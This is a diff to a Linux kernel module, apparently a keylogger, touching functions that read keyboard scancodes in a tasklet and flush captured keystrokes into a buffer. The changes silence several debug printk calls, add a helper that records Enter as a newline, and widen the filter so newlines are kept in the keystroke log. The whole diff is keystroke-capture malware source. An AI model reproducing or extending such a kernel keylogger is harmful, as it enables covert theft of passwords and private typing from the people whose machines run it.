@@ -45,7 +45,7 @@ int	keylogger_open(struct inode *inode, struct file *filp)
 		goto err;
 	}
 
-	printk(KERN_INFO "nbr entries %lu\n", size);
+	/* printk(KERN_INFO "nbr entries %lu\n", size); */
 	if (!(klg_buffer = kmalloc(60 * size + 1, GFP_KERNEL))) {
 		retval = -ENOMEM;
 		goto err;
@@ -71,7 +71,7 @@ err:
 
 int	keylogger_flush(struct file *filp, fl_owner_t id)
 {
-	printk(KERN_INFO "flushing klg_buffer\n");
+	/* printk(KERN_INFO "flushing klg_buffer\n"); */
 	kfree(filp->private_data);
 
 	return 0;
@@ -141,7 +141,7 @@ static void do_tasklet(unsigned long unused)
 		read_lock(&keyboard_rwlock);
 		packet = scan_array[rindex++];
 		read_unlock(&keyboard_rwlock);
-		printk(KERN_INFO "tasklet : [%x]\n", packet);
+		/* printk(KERN_INFO "tasklet : [%x]\n", packet); */
 		if (!(rindex = (rindex == SIZE) ? 0 : rindex))
 			target = windex;
 		scan_fsm_update(&scan_fsm, packet);
@@ -200,6 +200,13 @@ err:
 	return result;
 }
 
+static unsigned char	SWITCH_ASCII(unsigned char key)
+{
+	if (key == ENTER)
+		key = 10;
+	return key;
+}
+
 static void		ks_list_flush(void)
 {
 	struct list_head 	*pos;
@@ -208,7 +215,7 @@ static void		ks_list_flush(void)
 	struct file		*file;
 	mm_segment_t		old_fs;
 	loff_t			off = 0;
-	ssize_t			size = 0;	
+	ssize_t			size = 0;
 	char			*buf = NULL;
 	char			*tmp;
 	
@@ -221,9 +228,13 @@ static void		ks_list_flush(void)
 	memset(buf, 0, size + 1);
 
 	list_for_each_entry_safe(ks, n, &keystroke_list, list) {
-		if (ks->state == PRESSED && (ks->ascii >= 32 && ks->ascii <= 127))
+		printk("%d\n", (int)ks->ascii);
+		ks->ascii = SWITCH_ASCII(ks->ascii);
+		if (ks->state == PRESSED && ((ks->ascii >= 32 && ks->ascii <= 127) 
+			|| ks->ascii == 10)) {
 			strncat(buf, (char *)&ks->ascii, 1);
-		list_del(&ks->list);	
+		}
+		list_del(&ks->list);
 		kfree(ks);
 	}
 
